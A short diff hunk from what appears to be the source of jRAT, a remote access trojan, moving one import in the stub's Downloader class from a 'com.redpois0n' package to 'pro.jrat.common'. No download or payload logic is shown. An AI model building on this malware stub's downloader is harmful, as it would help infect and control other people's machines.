@@ -8,9 +8,9 @@ import java.net.URL;
 import java.net.URLConnection;
 import java.util.Random;
 
+import pro.jrat.common.OperatingSystem;
 import pro.jrat.stub.utils.Utils;
 
-import com.redpois0n.common.OperatingSystem;
 
 public class Downloader extends Thread {
 
